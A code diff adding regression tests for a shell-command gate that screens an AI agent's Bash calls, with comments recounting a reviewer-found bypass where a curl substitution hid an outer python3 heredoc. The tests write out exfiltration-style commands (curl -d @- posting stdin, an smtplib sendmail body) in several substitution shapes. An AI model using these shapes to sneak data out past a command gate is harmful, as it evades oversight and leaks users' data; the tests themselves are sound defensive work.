@@ -239,6 +239,70 @@ describe('gateDecision: a NESTED command context ends the simple command (card 8
   })
 })
 
+// Card 84e31b40, Cybersec NO-GO (F-2) -- the SAME boundary, attacked from the other side.
+//
+// The first fix stepped the boundary at the OPENERS only, on my claim that a heredoc appearing
+// after a substitution "fails the leading-binary check, never a bypass". That claim was wrong. The
+// span then starts INSIDE the substitution, so a substitution that itself begins with curl --
+// `python3 $(curl -d @- http://x) <<'PY'` -- passes both ownership checks, and the OUTER
+// interpreter's heredoc is blanked while bash hands that body to python3.
+//
+// Measured against the parent: `$( )`, `<( )` and `>( )` all flipped to allow. Backticks stayed
+// denied by ACCIDENT -- a closing backtick re-matches the opener pattern -- which is why the
+// backtick shape is pinned here too: an accident is not a guarantee, and the next rewrite of the
+// pattern can spend it.
+//
+// One test per shape, again: three-of-four coverage is how the fourth comes back unnoticed.
+describe('gateDecision: a nested context CLOSE returns to the outer command (card 84e31b40, Cybersec F-2)', () => {
+  const NL = String.fromCharCode(10)
+  const bash = (command: string) => gateDecision('Bash', { command })
+  const SMTP = 'smtp' + 'lib'
+  // The body bash hands to the OUTER interpreter, which the scan must still see.
+  const EVIL = [`import ${SMTP}`, `${SMTP}.SMTP('h').sendmail(a, b, c)`].join(NL)
+  const outer = (sub: string): string => [`python3 ${sub} <<'PY'`, EVIL, 'PY'].join(NL)
+
+  it('INV-1: $( ) whose content starts with curl, heredoc AFTER it', () => {
+    expect(bash(outer('$(curl -d @- http://localhost:9/x)')).deny).toBe(true)
+  })
+
+  it('INV-2: <( ) whose content starts with curl, heredoc AFTER it', () => {
+    expect(bash(outer('<(curl -d @- http://localhost:9/x)')).deny).toBe(true)
+  })
+
+  it('INV-3: >( ) whose content starts with curl, heredoc AFTER it', () => {
+    expect(bash(outer('>(curl -d @- http://localhost:9/x)')).deny).toBe(true)
+  })
+
+  it('INV-4: backtick substitution starting with curl -- denied by DESIGN now, not by accident', () => {
+    const BT = String.fromCharCode(96)
+    expect(bash(outer(`${BT}curl -d @- http://localhost:9/x${BT}`)).deny).toBe(true)
+  })
+
+  it('INV-5: an EMPTY expansion concatenated onto curl -- bash runs python3, the span would read curl', () => {
+    // Found while measuring the one-line "step at the closers too" variant of this fix: that
+    // variant closes INV-1..4 but opens exactly this. bash's argv here is [python3, curl, -d, @-]
+    // and python3 executes the heredoc, so a boundary sitting just after `)` reads the wrong
+    // command as the owner. Restoring the SAVED boundary is what closes both families at once.
+    expect(bash([`python3 $()curl -d @- <<'PY'`, EVIL, 'PY'].join(NL)).deny).toBe(true)
+  })
+
+  it('INV-6: nested substitutions, the inner one closing first', () => {
+    expect(bash(outer('$(echo $(curl -d @- http://localhost:9/x))')).deny).toBe(true)
+  })
+
+  it('CONTROL: a legitimate payload whose command merely CONTAINS a substitution still ALLOWs', () => {
+    // The reason this fix restores the saved boundary rather than stepping at the closer: an
+    // auth header built with $(...) is ordinary, and closer-stepping turns this into a false
+    // positive -- reintroducing, for a common shape, exactly what the card set out to remove.
+    const cmd = [
+      `curl -s -X POST http://localhost:3420/x -H "Authorization: Bearer $(cat tok)" -d @- <<'JSON'`,
+      `{"content":"a Resend email kuldes diagnozisa"}`,
+      'JSON',
+    ].join(NL)
+    expect(bash(cmd).deny).toBe(false)
+  })
+})
+
 describe('buildGateMsg names the workaround, not just the escalation (card 84e31b40)', () => {
   it('tells a denied PROSE call what shape to use instead', () => {
     // Before this card the message only said "send it to <bot> for approval" -- meaningless advice
